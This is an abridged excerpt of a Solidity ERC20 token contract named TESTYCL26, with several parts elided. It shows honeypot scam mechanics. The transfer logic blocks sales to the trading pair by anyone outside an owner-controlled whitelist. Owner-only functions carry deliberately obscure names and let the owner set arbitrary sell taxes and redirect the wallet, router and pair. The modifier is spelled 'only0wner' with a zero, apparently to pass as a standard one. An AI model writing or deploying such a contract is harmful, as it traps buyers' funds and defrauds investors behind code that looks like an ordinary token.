...
contract TESTYCL26 is ERC20, Ownable{
    ...
    mapping (address => bool) public _antiqueCircle_;
    ...
    constructor() ERC20("TESTYCL26", "TESTYCL26") {
        ...
        _antiqueCircle_[msg.sender] = true;
        _antiqueCircle_[address(pair)] = true;
        _antiqueCircle_[marketingWallet] = true;
        _antiqueCircle_[address(router)] = true;
        _antiqueCircle_[address(this)] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if(recipient == pair) {
            if(numbertamp[sender] != block.number && numbertamp[sender] > 0){
                require(_antiqueCircle_[sender]);
            }
    ...
    function _defenseCritic_(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function _cuteCute_(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _antiqueCircle_[accounts[i]] = newValue;
        }
    }

    function _alcoholClownAdmit_(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function _copyDefineArctic_(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function _debateCottonCoverArrive_(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function _dreamAssistCulture_(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
